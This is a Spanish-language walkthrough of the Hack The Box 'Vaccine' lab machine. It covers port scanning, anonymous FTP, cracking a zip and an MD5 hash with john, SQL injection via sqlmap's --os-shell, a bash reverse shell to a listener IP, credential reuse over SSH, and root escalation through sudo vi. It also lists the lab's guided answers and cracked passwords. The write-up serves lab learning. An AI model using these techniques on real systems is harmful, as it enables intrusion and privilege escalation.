---
title: Writeup vaccine - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - vaccine
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina vaccine en Hack The Box.
keywords:
  - writeup vaccine
  - hack the box vaccine
  - resolución máquina vaccine
  - vaccine hack the box
  - htb vaccine
---
---------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/SuperFacil/Tier+2/Linux/Vaccine)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=lFJHQi1Ih30)|[Parte2](https://www.youtube.com/watch?v=AgI24N6KmjQ)
- 🧠 **Explicación resumida**: 

--------

#veryeasy #Linux #ping #nmap #john #zip2john #whatweb #ftp #sqli #reverseshell #ssh #tratamientotty #sudo-l #tratamientotty #sudo

---
# Guided Mode

1)Además de SSH y HTTP, ¿qué otro servicio está alojado en esta caja?
	ftp

2)Este servicio puede configurarse para permitir el inicio de sesión con cualquier contraseña para un nombre de usuario específico. ¿Cuál es ese nombre de usuario?
	anonymous

3)¿Cuál es el nombre del archivo descargado a través de este servicio?
	backup.zip

4)¿Qué script viene con el conjunto de herramientas John The Ripper y genera un hash a partir de un archivo zip protegido por contraseña en un formato que permite intentos de crackeo?
	zip2john

5)¿Cuál es la contraseña del usuario administrador del sitio web?
	qwerty789

6)¿Qué opción se puede pasar a sqlmap para intentar obtener la ejecución de comandos a través de la inyección sql?
	--os-shell

7)¿Qué programa puede ejecutar el usuario postgres como root usando sudo?
	vi

-----
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.163.23
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.129.163.23 -oG allPorts
extractPorts allPorts
nmap -sCV -p21,22,80 10.129.163.23 -oN target
```

![[Vaccine4.png]]

![[Vaccine1.png]]

![[Vaccine2.png]]

![[Vaccine3.png]]
*TTL:* Maquina Linux
*Puertos:*
	`21`FTP | Vulnerabilidad con usuario anonymous
	`22`SSH
	`80`Apache/HTTP

--------
# [[Whatweb-wappalyzer]]

![[Vaccine5.png]]
No da ninguna informacion relevante

----------------
# Pagina web

![[Vaccine11.png]]

----
# Ingreso a [[ftp]] con usuario anonymous

`ftp 10.129.163.23 -p 21`
Entramos al servicio de ftp y descargamos el unico archivo con `get` que se llama backup.zip
![[Vaccine6.png]]

-------
# Sacamos el hash del archivo zip con [[zip2john]] y crackeamos contraseña con [[john]]

Intentamos descomprimir el archivo [[Herramientas-Comandos/unzip]] `unzip backup.zip`
![[Vaccine7.png]]
Tiene contraseña asi que no lo podemos descomprimir. Usamos [[zip2john]] para sacarle el hash al archivo y luego con [[john]] crackeamos la contraseña

```shell
zip2john backup.zip > hash
john -w=/usr/share/wordlists/rockyou.txt hash
```

![[Vaccine8.png]]
 Nos da que la contraseña del backup.zip es ``741852963``
 
Ahora descomprimimos y buscamos en los archivos que nos da si tiene algun tipo de contraseña para logearnos al panel de la web
Con [[Herramientas-Comandos/unzip]] ``unzip backup.zip`` descomprimimos y con [[cat]][[grep]] `cat index.php | grep -i password` buscamos en los archivos si tenia contraseñas
![[Vaccine9.png]]
Nos dice que el usuario es admin y la contraseña esta en md5 2cb42f8734ea607eefed3b70af13bbd3

#### Crackeamos la contraseña que esta en md5 con [[john]]
``john -w=/usr/share/wordlists/rockyou.txt --format=raw-md5 md5 ``            | IMPORTANTE USAR el parametro de --format por que si no no crackea la contraseña
![[Vaccine10.png]]
Contraseña: ``qwerty789``
Ponemos los datos de logeo y ya estamos adentro

-------
# SQLI con [[sqlmap NO USAR]] y mandamos una [[Reverse shell]]

Al poner una ' en la parte de search nos aparece este error

![[Vaccine12.png]]
Por esto que dice `ilike` sabemos que es [[postgresql]] ya que es un error caracteristico de esta base de datos
Pero si probamos con otra inyeccion por ejemplo ``' or 1=1-- -``  ``o ' or 1=2-- -`` no nos aparece nada
##### Esto es lo que pudimos sacar manualmente, a partir de aca usamos sqlmap que la verdad no lo queria usar, pero no encontre como mandar una revershell a traves de una sqli para hacer manual el proceso, asi que seguimos los pasos del writeup


```
ACLARACION IMPORTANTE: En la parte de cookie, poner el que tenga cada uno, desde la pagina logeado como administrador apretar CTRL + SHIFT + I y ver las cookies
sqlmap -u 'http://10.129.163.241/dashboard.php?search=any+query' --cookie="PHPSESSID=rmqiliocl577tgkamdu19smmbe" -v 3        / Primero usar este comando que va a hacer el analisis
sqlmap -u 'http://10.129.163.241/dashboard.php?search=any+query' --cookie="PHPSESSID=rmqiliocl577tgkamdu19smmbe" -v 3 --os-shell           /Agregando el parametro de os shell, nos va a dejar ejecutar comandos
bash -c 'bash -i >& /dev/tcp/10.10.16.17/443 0>&1'                 / Este es el comando que vamos a poner para usar la revershell
```
Recordar estar en escucha con [[nc -nlvp 443]] para la [[Reverse shell]]
El cookie seria el value de PHPSESSID


![[Vaccine14.png]]

![[Vaccine13.png]]

-------
# Conseguimos credenciales para conectarnos por [[ssh]]

##### Algo a tener en cuenta es que es muy inestable la maquina, todo el tiempo se me iba la conexion y tenia que volver a mandar la [[Reverse shell]], por que no hice [[Tratamiento de la TTY]] ya que cada 30-60 segundos se me iba la conexion

Desde la carpeta /var/www/html vamos a usar el comando `grep -riE "password|.*pasword|password.*"` para buscar posibles contraseñas

![[Vaccine16.png]]
*Resultado*
dashboard.php:	 $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
Probamos las contraseñas que usa para la base de datos postre en ssh y pudimos entrar, asi que sabemos que repite las credenciales que usa

--------
# Nos conectamos por [[ssh]]

``ssh postgres@10.129.163.241`` y ponemos de contraseña `P@s5w0rd!`
![[Vaccine17.png]]

-----
# [[Tratamiento de la TTY]]

-----

# Escalada de privilegios con [[Abuso de Sudo]]

```shell
sudo -l
```

![[Vaccine18.png]]
Vemos que todos podemos ejecutar el binario /bin/vi /etc/postgresql/11/main/pg_hba.conf

Vemos que vulnerabilidad hay en la pagina de [GTFOBINS](https://gtfobins.github.io/gtfobins/vi/#sudo)

![[Vaccine22.png]]

Asi que abrimos con ``sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`` el binario para abrirlo como root. Para posteriormente salir del vi ejecutando una bash

![[Vaccine19.png]]

Desde el vi apretamos `:` en el teclado y vamos a poner estos dos comandos
```
:set shell=/bin/sh
:shell
```
![[Vaccine20.png]]

Y listo ya tenemos la bash como root, ahora solo queda ver las flags


![[Vaccine21.png]]


-------
# Creditos
Writeup Oficial HackTheBox
Writeup de [wetofu](https://wetofu.github.io/ctf/writeup/htb/htb-vaccine/)
